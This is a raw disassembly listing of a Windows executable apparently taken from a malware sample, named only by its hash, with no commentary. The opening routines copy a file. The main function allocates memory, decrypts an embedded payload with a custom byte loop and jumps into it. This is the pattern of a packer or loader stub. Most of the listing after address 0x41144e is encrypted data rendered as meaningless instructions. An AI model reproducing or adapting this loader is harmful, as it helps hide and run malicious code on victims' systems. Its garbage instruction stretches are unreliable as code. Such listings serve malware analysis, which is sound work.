
0a7fc8a656ade5401dae2c1d4dcf4ca55ef6fc51a13336f801d25938f71fb636.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x4291e0
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x4291d8
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429018
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429014
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429010
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x42900c
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x429028
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429040
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x429048
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x429118
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291a0
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x429178
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429148
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429120
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  edx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    eax,DWORD PTR [esp+0x10]
  4111a9:	mov    ecx,DWORD PTR [esp+0x14]
  4111ad:	add    eax,ecx
  4111af:	mov    DWORD PTR [esp+0x10],eax
  4111b3:	shr    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    ecx,eax
  4111bb:	shr    ecx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,ecx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	mov    ecx,DWORD PTR [esp+0x24]
  4111d6:	add    bl,dl
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x48],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x70],0x0
  41120b:	mov    DWORD PTR [ebp-0x60],0x0
  411212:	mov    DWORD PTR [ebp-0x8],0x0
  411219:	mov    DWORD PTR [ebp-0x6c],0x0
  411220:	mov    DWORD PTR [ebp-0x68],0x0
  411227:	mov    DWORD PTR [ebp-0x14],0x0
  41122e:	mov    DWORD PTR [ebp-0x4c],0x0
  411235:	mov    DWORD PTR [ebp-0x10],0x0
  41123c:	mov    DWORD PTR [ebp-0x58],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x5c],0x0
  411251:	mov    DWORD PTR [ebp-0x30],0x0
  411258:	mov    DWORD PTR [ebp-0x54],0x0
  41125f:	mov    DWORD PTR [ebp-0x2c],0x0
  411266:	mov    DWORD PTR [ebp-0x50],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x42920c
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429210
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x429214
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429218
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x4291fc
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429200
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x429204
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429208
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x42920a
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	lea    eax,[ebp-0x10]
  4112ce:	push   eax
  4112cf:	push   0x4291e8
  4112d4:	call   DWORD PTR ds:0x429004
  4112da:	test   eax,eax
  4112dc:	je     0x411324
  4112de:	push   0x0
  4112e0:	push   0x0
  4112e2:	push   0x0
  4112e4:	call   DWORD PTR ds:0x429034
  4112ea:	mov    DWORD PTR [ebp-0x14],eax
  4112ed:	lea    ecx,[ebp-0x40]
  4112f0:	push   ecx
  4112f1:	lea    edx,[ebp-0x10]
  4112f4:	push   edx
  4112f5:	call   DWORD PTR ds:0x429000
  4112fb:	test   eax,eax
  4112fd:	je     0x411324
  4112ff:	mov    eax,DWORD PTR [ebp-0x10]
  411302:	add    eax,0x1
  411305:	mov    DWORD PTR [ebp-0x10],eax
  411308:	push   0x14
  41130a:	push   0x0
  41130c:	mov    ecx,DWORD PTR [ebp-0x14]
  41130f:	push   ecx
  411310:	call   DWORD PTR ds:0x429030
  411316:	push   0x0
  411318:	push   0x0
  41131a:	mov    edx,DWORD PTR [ebp-0x14]
  41131d:	push   edx
  41131e:	call   DWORD PTR ds:0x42902c
  411324:	mov    BYTE PTR [ebp-0x40],0x56
  411328:	call   DWORD PTR ds:0x429044
  41132e:	mov    DWORD PTR [ebp-0x2c],eax
  411331:	mov    BYTE PTR [ebp-0x3e],0x72
  411335:	movzx  eax,WORD PTR [ebp-0x2c]
  411339:	cmp    eax,0x539
  41133e:	jne    0x411380
  411340:	mov    BYTE PTR [ebp-0x34],0x0
  411344:	mov    DWORD PTR [ebp-0x14],0xe0d
  41134b:	lea    ecx,[ebp-0x28]
  41134e:	push   ecx
  41134f:	call   DWORD PTR ds:0x429024
  411355:	mov    DWORD PTR [ebp-0x60],eax
  411358:	mov    DWORD PTR [ebp-0x54],0x3a
  41135f:	lea    edx,[ebp-0x40]
  411362:	push   edx
  411363:	mov    eax,DWORD PTR [ebp-0x60]
  411366:	push   eax
  411367:	call   DWORD PTR ds:0x429020
  41136d:	mov    DWORD PTR [ebp-0x44],eax
  411370:	mov    DWORD PTR [ebp-0x8],0x3c893862
  411377:	mov    DWORD PTR [ebp-0x68],0x10d93f
  41137e:	jmp    0x411395
  411380:	mov    BYTE PTR ds:0x444a58,0x0
  411387:	mov    BYTE PTR ds:0x42cb88,0x0
  41138e:	mov    BYTE PTR ds:0x442b18,0x0
  411395:	mov    DWORD PTR [ebp-0x2c],0x410000
  41139c:	push   DWORD PTR ds:0x429024
  4113a2:	pop    edx
  4113a3:	mov    DWORD PTR [ebp-0x6c],edx
  4113a6:	push   DWORD PTR [ebp-0x30]
  4113a9:	push   0x1000
  4113ae:	mov    eax,DWORD PTR [ebp-0x14]
  4113b1:	add    eax,0x23
  4113b4:	add    eax,0x23
  4113b7:	push   eax
  4113b8:	xor    eax,eax
  4113ba:	push   eax
  4113bb:	mov    ecx,DWORD PTR [ebp-0x44]
  4113be:	call   ecx
  4113c0:	push   eax
  4113c1:	pop    ecx
  4113c2:	mov    DWORD PTR [ebp-0x4],ecx
  4113c5:	mov    ecx,DWORD PTR [ebp-0x68]
  4113c8:	sub    ecx,0xdae0b
  4113ce:	mov    DWORD PTR [ebp-0x68],ecx
  4113d1:	cmp    DWORD PTR [ebp-0x4],0x0
  4113d5:	jne    0x4113de
  4113d7:	mov    BYTE PTR ds:0x442b18,0x0
  4113de:	mov    edx,DWORD PTR [ebp-0x4]
  4113e1:	add    edx,DWORD PTR [ebp-0x14]
  4113e4:	mov    eax,DWORD PTR [ebp-0x8]
  4113e7:	mov    DWORD PTR [edx],eax
  4113e9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ec:	add    ecx,DWORD PTR [ebp-0x54]
  4113ef:	mov    DWORD PTR [ebp-0x5c],ecx
  4113f2:	mov    edx,DWORD PTR ds:0x429020
  4113f8:	mov    DWORD PTR [ebp-0x4c],edx
  4113fb:	mov    eax,DWORD PTR [ebp-0x4]
  4113fe:	add    eax,DWORD PTR [ebp-0x14]
  411401:	mov    ecx,DWORD PTR [ebp+0x8]
  411404:	mov    DWORD PTR [eax+0x4],ecx
  411407:	mov    edx,DWORD PTR [ebp-0x4]
  41140a:	add    edx,DWORD PTR [ebp-0x14]
  41140d:	mov    DWORD PTR [ebp-0xc],edx
  411410:	cmp    DWORD PTR [ebp-0x68],0x0
  411414:	jbe    0x411431
  411416:	mov    eax,DWORD PTR [ebp-0xc]
  411419:	push   eax
  41141a:	mov    ecx,DWORD PTR [ebp-0x14]
  41141d:	push   ecx
  41141e:	mov    edx,DWORD PTR [ebp-0x2c]
  411421:	add    edx,DWORD PTR [ebp-0x68]
  411424:	push   edx
  411425:	mov    eax,DWORD PTR [ebp-0x4]
  411428:	push   eax
  411429:	call   0x411170
  41142e:	add    esp,0x10
  411431:	cmp    DWORD PTR [ebp-0x5c],0x0
  411435:	je     0x411448
  411437:	push   DWORD PTR [ebp-0x4c]
  41143a:	push   DWORD PTR [ebp-0x6c]
  41143d:	mov    edx,DWORD PTR [ebp-0x5c]
  411440:	push   eax
  411441:	jmp    edx
  411443:	jmp    0x422f1d
  411448:	mov    ecx,DWORD PTR [ebp+0x8]
  41144b:	mov    DWORD PTR [ebp-0x18],ecx
  41144e:	outs   dx,DWORD PTR ds:[esi]
  41144f:	and    DWORD PTR ss:[ecx],eax
  411452:	test   BYTE PTR [edi+0x3c43bf69],cl
  411458:	pop    ss
  411459:	add    eax,0x28fee821
  41145e:	cli    
  41145f:	aad    0xf5
  411461:	xchg   ecx,eax
  411462:	and    al,0x69
  411464:	test   DWORD PTR ss:[esi],0xf2b873a4
  41146b:	jne    0x41149a
  41146d:	xor    al,0x8c
  41146f:	in     al,0x11
  411471:	xchg   ebx,eax
  411472:	jae    0x411413
  411474:	pop    ebx
  411475:	lods   al,BYTE PTR ds:[esi]
  411476:	leave  
  411477:	fcmovnbe st,st(6)
  411479:	sub    DWORD PTR [ebx-0x15],esp
  41147c:	jecxz  0x4114ec
  41147e:	jecxz  0x4114da
  411480:	ins    DWORD PTR es:[edi],dx
  411481:	add    DWORD PTR [eax-0x6c],ebx
  411484:	nop
  411485:	cdq    
  411486:	sub    edx,DWORD PTR [ebp+0x2cf5132]
  41148c:	ins    BYTE PTR es:[edi],dx
  41148d:	repz test BYTE PTR [eax+0x54],dl
  411491:	shl    DWORD PTR [ecx+0x53ad72da],0x91
  411498:	add    BYTE PTR [edx+0x1e],bh
  41149b:	jle    0x411461
  41149d:	cmp    al,0x92
  41149f:	inc    edi
  4114a0:	and    al,0x7c
  4114a2:	cmp    al,0xe3
  4114a4:	fcmovne st,st(7)
  4114a6:	div    bl
  4114a8:	test   al,0x73
  4114aa:	cld    
  4114ab:	dec    ecx
  4114ac:	sbb    ch,BYTE PTR [ebx+0xa]
  4114af:	and    eax,0x70ed91f3
  4114b4:	dec    ebp
  4114b5:	(bad)  
  4114b6:	jmp    DWORD PTR [ecx+0x79]
  4114b9:	dec    ebp
  4114ba:	out    0x4b,al
  4114bc:	pop    edi
  4114bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114be:	mov    eax,ebp
  4114c0:	icebp  
  4114c1:	lock xchg ebp,eax
  4114c3:	lds    ebx,FWORD PTR [ebx-0x7c]
  4114c6:	out    dx,eax
  4114c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114c8:	fsub   QWORD PTR [edx+0x3b192db8]
  4114ce:	adc    al,0xde
  4114d0:	loopne 0x411462
  4114d2:	xchg   ebp,eax
  4114d3:	scas   al,BYTE PTR es:[edi]
  4114d4:	sub    edx,DWORD PTR [edi]
  4114d6:	lahf   
  4114d7:	fmul   QWORD PTR [ecx]
  4114d9:	int3   
  4114da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114db:	adc    DWORD PTR es:[ecx+eax*8],esi
  4114df:	xor    DWORD PTR [eax+edi*1-0x79],edx
  4114e3:	xor    DWORD PTR [ebx+edx*2-0x4635f956],0xb037f897
  4114ee:	add    al,BYTE PTR [edi-0x48]
  4114f1:	and    cl,BYTE PTR [ecx+0x401c0d2d]
  4114f7:	cli    
  4114f8:	pop    ss
  4114f9:	mov    ch,bl
  4114fb:	pop    eax
  4114fc:	(bad)  
  4114fd:	fmul   QWORD PTR [edx]
  4114ff:	data16 fsubr QWORD PTR [edx]
  411502:	inc    esp
  411503:	into   
  411504:	dec    ecx
  411505:	repz fld TBYTE PTR [ebp-0x8]
  411509:	(bad)  
  41150a:	out    0xfd,eax
  41150c:	lods   eax,DWORD PTR ds:[esi]
  41150d:	nop
  41150e:	add    esi,DWORD PTR [eax+0x23]
  411511:	xor    al,0x7f
  411513:	sbb    DWORD PTR [eax+0x158a5b73],eax
  411519:	shl    BYTE PTR [eax],0x92
  41151c:	shl    edx,0x1e
  41151f:	inc    ecx
  411520:	icebp  
  411521:	int3   
  411522:	mov    edi,0x33d73430
  411527:	sub    ah,BYTE PTR [eax]
  411529:	xchg   esi,eax
  41152a:	mov    ebx,0xe1e1b2a2
  41152f:	ret    
  411530:	into   
  411531:	sub    al,0xf
  411533:	adc    DWORD PTR [ebx-0x27],eax
  411536:	jne    0x4114d3
  411538:	lods   al,BYTE PTR ds:[esi]
  411539:	xor    eax,0x381d837c
  41153e:	out    dx,eax
  41153f:	xor    BYTE PTR ds:0xb0610ed1,bl
  411545:	sub    edi,0x1
  411548:	loope  0x41153e
  41154a:	and    BYTE PTR [ecx],dh
  41154c:	and    edx,DWORD PTR [ebp+0x5c1dd78a]
  411552:	inc    ebx
  411553:	mov    gs,WORD PTR [edi-0x341dd359]
  411559:	mov    eax,0xd57ef226
  41155e:	mov    ecx,0xdcdf82cb
  411563:	sti    
  411564:	mov    esp,0xe618ef13
  411569:	xchg   ecx,eax
  41156a:	xchg   esp,eax
  41156b:	mov    cl,0xf
  41156d:	jb     0x41153d
  41156f:	dec    ebx
  411570:	rcr    DWORD PTR [esi+0x1bafad7f],0x97
  411577:	lods   eax,DWORD PTR ds:[esi]
  411578:	add    DWORD PTR ds:0xd4c0e283,edx
  41157e:	add    al,BYTE PTR [eax+edx*2]
  411581:	bound  eax,QWORD PTR [edx+ecx*8-0x6e]
  411585:	inc    DWORD PTR [edi-0x695d50d3]
  41158b:	pop    ds
  41158c:	lods   al,BYTE PTR ds:[esi]
  41158d:	es popf 
  41158f:	out    0xa6,al
  411591:	mov    al,0x2b
  411593:	icebp  
  411594:	shl    DWORD PTR [esp+ebx*2+0x7],1
  411598:	lds    eax,FWORD PTR gs:[edx+0x337a0e7d]
  41159f:	cmp    bh,0x43
  4115a2:	inc    ebx
  4115a3:	icebp  
  4115a4:	push   es
  4115a5:	jmp    0x3c14:0xd517d2e2
  4115ac:	mov    eax,ds:0xbc55bdf2
  4115b1:	pop    ecx
  4115b2:	out    dx,al
  4115b3:	ins    DWORD PTR es:[edi],dx
  4115b4:	jae    0x411600
  4115b6:	(bad)  
  4115b7:	adc    eax,0xb44824b8
  4115bc:	fisttp WORD PTR [esi-0x60ec6ffe]
  4115c2:	sub    eax,0x5f0dfdef
  4115c7:	sbb    al,0xf0
  4115c9:	iret   
  4115ca:	xor    DWORD PTR [ecx+0x30],0xffffffe7
  4115ce:	aam    0x72
  4115d0:	cmp    eax,edx
  4115d2:	add    esi,DWORD PTR [edx+0x7559fa7f]
  4115d8:	fsubr  DWORD PTR [edi+0x701f8c26]
  4115de:	in     eax,dx
  4115df:	clc    
  4115e0:	pop    edi
  4115e1:	xor    al,0x9c
  4115e3:	outs   dx,DWORD PTR ds:[esi]
  4115e4:	sbb    BYTE PTR [eax+0x3c],al
  4115e7:	lea    edi,[ecx-0x6236b194]
  4115ed:	pop    ebx
  4115ee:	sub    al,0xcc
  4115f0:	or     eax,0x4fd6e124
  4115f5:	mov    ds:0xa0746203,eax
  4115fa:	mov    ah,BYTE PTR [ecx-0x1d61b719]
  411600:	fwait
  411601:	push   eax
  411602:	jbe    0x41158f
  411604:	into   
  411605:	das    
  411606:	in     eax,dx
  411607:	inc    ebx
  411608:	(bad)  
  411609:	dec    ebp
  41160a:	imul   DWORD PTR [ebp-0x59374fde]
  411610:	pop    esi
  411611:	scas   eax,DWORD PTR es:[edi]
  411612:	push   ebx
  411613:	stos   BYTE PTR es:[edi],al
  411614:	adc    ah,BYTE PTR [edx-0x66879eb5]
  41161a:	fsubp  st(0),st
  41161c:	dec    ebx
  41161d:	jle    0x4115b9
  41161f:	and    esp,DWORD PTR [eax]
  411621:	cmc    
  411622:	mov    esp,0x660938af
  411627:	sub    DWORD PTR [ebx+0x5c],esi
  41162a:	mov    al,0x37
  41162c:	add    BYTE PTR [ebp+eax*2-0x6],al
  411630:	jl     0x411636
  411632:	stc    
  411633:	rcr    dl,cl
  411635:	jo     0x4115ec
  411637:	xlat   BYTE PTR ds:[ebx]
  411638:	mov    esi,0x7e23fe42
  41163d:	cmp    bl,0x27
  411640:	jne    0x411604
  411642:	dec    edx
  411643:	sbb    eax,0xb3c93d78
  411648:	jb     0x411605
  41164a:	xchg   ebp,eax
  41164b:	out    dx,al
  41164c:	sar    DWORD PTR [eax-0x1a],cl
  41164f:	aam    0xf6
  411651:	lock jmp 0xe279170a
  411657:	daa    
  411658:	popa   
  411659:	push   ebx
  41165a:	jno    0x4115e7
  41165c:	test   DWORD PTR [ecx-0x67],0xc2ed4322
  411663:	shr    bl,1
  411665:	mov    ds:0x68d8772e,al
  41166a:	push   cs
  41166b:	xchg   BYTE PTR [ecx-0x53],dl
  41166e:	scas   al,BYTE PTR es:[edi]
  41166f:	cmp    edi,0x2729e748
  411675:	jle    0x411602
  411677:	retf   0xa7b6
  41167a:	jge    0x411669
  41167c:	imul   esp,DWORD PTR [edi-0x12],0x5ac3a4ba
  411683:	out    0xc3,eax
  411685:	out    dx,al
  411686:	enter  0x2689,0xa4
  41168a:	xor    DWORD PTR [esi-0x179f520e],ecx
  411690:	inc    eax
  411691:	jg     0x411616
  411693:	gs jp  0x411624
  411696:	xchg   edx,eax
  411697:	jmp    0xef18:0xab6505cf
  41169e:	jmp    0x1dec:0x56f85db
  4116a5:	test   esi,eax
  4116a7:	pop    ss
  4116a8:	(bad)  
  4116a9:	(bad)  
  4116aa:	call   0xecac:0xc995e62f
  4116b1:	fdivr  st(6),st
  4116b3:	jle    0x411678
  4116b5:	mov    bl,0x21
  4116b7:	imul   ecx,DWORD PTR [esi+0x2a],0x3b
  4116bb:	inc    ebp
  4116bc:	mov    BYTE PTR [ecx],dh
  4116be:	fneni(8087 only) 
  4116c0:	mov    esp,0xa6046f14
  4116c5:	inc    ebx
  4116c6:	sbb    esp,DWORD PTR [ecx]
  4116c8:	mov    bh,0x9a
  4116ca:	pop    edx
  4116cb:	pusha  
  4116cc:	outs   dx,DWORD PTR ds:[esi]
  4116cd:	outs   dx,BYTE PTR ds:[esi]
  4116ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116cf:	cmc    
  4116d0:	pop    ecx
  4116d1:	mov    dl,0x31
  4116d3:	jns    0x411659
  4116d5:	xchg   esp,eax
  4116d6:	lods   al,BYTE PTR ds:[esi]
  4116d7:	data16 add al,0x56
  4116da:	jns    0x4116b4
  4116dc:	add    eax,0x9bc217d6
  4116e1:	mov    DWORD PTR [ebp+0x483baf31],0x58ddcdaf
  4116eb:	test   edi,edi
  4116ed:	stc    
  4116ee:	test   DWORD PTR [esi],edi
  4116f0:	sti    
  4116f1:	fmul   DWORD PTR [ebx]
  4116f3:	lds    esp,FWORD PTR [edi-0x2d]
  4116f6:	jl     0x411767
  4116f8:	pop    esi
  4116f9:	add    BYTE PTR [edx+0x0],al
  4116fc:	jge    0x41171e
  4116fe:	mov    gs,eax
  411700:	int    0xb
  411702:	outs   dx,DWORD PTR ds:[esi]
  411703:	push   ss
  411704:	and    BYTE PTR [edi+0x39],0x69
  411708:	popf   
  411709:	sbb    eax,0x7446a38b
  41170e:	(bad)  
  41170f:	jo     0x411698
  411711:	ds fucom st(4)
  411714:	jmp    0x68c0a0f7
  411719:	cli    
  41171a:	xor    cl,bl
  41171c:	push   ebx
  41171d:	inc    ebx
  41171e:	inc    ecx
  41171f:	inc    edi
  411720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411721:	pop    esi
  411722:	pop    ds
  411723:	jnp    0x411749
  411725:	and    DWORD PTR [ebx-0x7be5b866],ecx
  41172b:	cmp    DWORD PTR [edi-0x11],esi
  41172e:	inc    edi
  41172f:	mov    esp,0xae66e654
  411734:	dec    edx
  411735:	or     ecx,0xbd8a5d1a
  41173b:	inc    esp
  41173c:	inc    ebx
  41173d:	ds add al,0x55
  411740:	(bad)  
  411741:	push   ecx
  411742:	stos   DWORD PTR es:[edi],eax
  411743:	or     ch,BYTE PTR [ecx+ebp*4-0x44224db1]
  41174a:	jae    0x411716
  41174c:	push   cs
  41174d:	and    DWORD PTR [edx],esp
  41174f:	iret   
  411750:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411751:	shr    DWORD PTR [eax-0x59a228c3],0x75
  411758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411759:	sbb    eax,0xed86489b
  41175e:	int    0x30
  411760:	into   
  411761:	inc    eax
  411763:	cmp    DWORD PTR [edx+0x49],esi
  411766:	mov    eax,ds:0x4668687f
  41176b:	call   0xb66d78ac
  411770:	xor    bl,BYTE PTR [ebx]
  411772:	call   DWORD PTR [edi+ebx*2-0x53e54b78]
  411779:	jne    0x41174b
  41177b:	int    0xeb
  41177d:	neg    BYTE PTR [eax-0x17c224c4]
  411783:	ror    BYTE PTR [ebx],cl
  411785:	sbb    al,0x40
  411787:	stos   DWORD PTR es:[edi],eax
  411788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411789:	cmp    DWORD PTR [ecx+ecx*1-0x33423217],eax
  411790:	nop
  411791:	in     eax,dx
  411792:	ret    0x1259
  411795:	pop    esp
  411796:	dec    edx
  411797:	ret    
  411798:	outs   dx,BYTE PTR ds:[esi]
  411799:	sbb    esp,DWORD PTR [edx+0x65]
  41179c:	fidiv  DWORD PTR [edi]
  41179e:	das    
  41179f:	pushf  
  4117a0:	xchg   BYTE PTR [ebp-0x5b],dl
  4117a3:	dec    ebp
  4117a4:	sbb    al,0x65
  4117a6:	out    0x1d,eax
  4117a8:	jno    0x41173b
  4117aa:	ret    0x6ffc
  4117ad:	fsubp  st(5),st
  4117af:	xchg   edi,eax
  4117b0:	clc    
  4117b1:	ins    DWORD PTR es:[edi],dx
  4117b2:	(bad)  
  4117b3:	std    
  4117b4:	jbe    0x411805
  4117b6:	out    dx,al
  4117b7:	mov    ebp,0x82fe63e2
  4117bc:	call   0x26a8:0x13a49fc5
  4117c3:	mov    ah,0x76
  4117c5:	std    
  4117c6:	scas   al,BYTE PTR es:[edi]
  4117c7:	or     DWORD PTR [eax-0x33],esp
  4117ca:	and    cl,ah
  4117cc:	jne    0x411846
  4117ce:	adc    esp,DWORD PTR ds:0x582e61ed
  4117d4:	jge    0x4117d1
  4117d6:	push   cs
  4117d7:	ja     0x4117bd
  4117d9:	into   
  4117da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117db:	(bad)  
  4117dc:	aaa    
  4117dd:	sub    al,0xb6
  4117df:	xchg   ebx,eax
  4117e0:	outs   dx,BYTE PTR ds:[esi]
  4117e2:	sub    DWORD PTR [eax+0x45fd6032],eax
  4117e8:	cld    
  4117e9:	adc    ebx,ebp
  4117eb:	mov    eax,0x2680f468
  4117f0:	loop   0x4117dd
  4117f2:	popf   
  4117f3:	pusha  
  4117f4:	jge    0x411836
  4117f6:	fnstenv [ebx]
  4117f8:	sub    al,0x3a
  4117fa:	xchg   BYTE PTR [ecx+0x1c],ch
  4117fd:	and    cl,0xfc
  411800:	ss pop esp
  411802:	jnp    0x411794
  411804:	test   DWORD PTR ds:0xa0f74e88,0xa68316b7
  41180e:	xor    edx,ebp
  411810:	pop    ds
  411811:	mov    edx,ebx
  411813:	pop    ss
  411814:	mov    ah,0xc8
  411816:	cdq    
  411817:	jne    0x41183c
  411819:	jg     0x4117d2
  41181b:	add    ecx,edi
  41181d:	or     eax,0xddff9631
  411822:	mov    eax,ds:0xebb0c7e5
  411827:	and    cl,ah
  411829:	adc    DWORD PTR [ebx+0x15],ebp
  41182c:	sti    
  41182d:	push   cs
  41182e:	cmp    BYTE PTR [eax],cl
  411830:	sbb    bh,BYTE PTR [esi]
  411832:	fisttp WORD PTR [ecx*8+0x475f4c75]
  411839:	cmp    DWORD PTR [ecx],0x3f
  41183c:	jp     0x4118af
  41183e:	or     dh,BYTE PTR [eax-0x3c0a77ee]
  411844:	mov    al,0x2f
  411846:	in     eax,0xd0
  411848:	int    0xd1
  41184a:	mov    BYTE PTR [esp+eax*4+0x68],bl
  41184e:	(bad)  
  41184f:	mov    bl,0x5c
  411851:	aaa    
  411852:	xchg   ecx,eax
  411853:	xchg   ecx,eax
  411854:	out    dx,eax
  411855:	xchg   BYTE PTR [esi],ah
  411857:	pop    ss
  411858:	inc    ebx
  411859:	and    BYTE PTR [edi+edx*1-0x49],ch
  41185d:	stc    
  41185e:	loop   0x41180f
  411860:	ins    BYTE PTR es:[edi],dx
  411861:	ret    0x3acd
  411864:	lods   eax,DWORD PTR ds:[esi]
  411865:	pop    ecx
  411866:	imul   edi,DWORD PTR [edx+0x7d39807f],0xf725deec
  411870:	add    dl,0x61
  411873:	not    BYTE PTR [eax+0x75]
  411876:	repz sub BYTE PTR [eax-0x47],0x30
  41187b:	mov    edi,0x20f896f6
  411880:	fisttp DWORD PTR [edx+ebp*8+0x0]
  411884:	leave  
  411885:	jg     0x41185e
  411887:	int3   
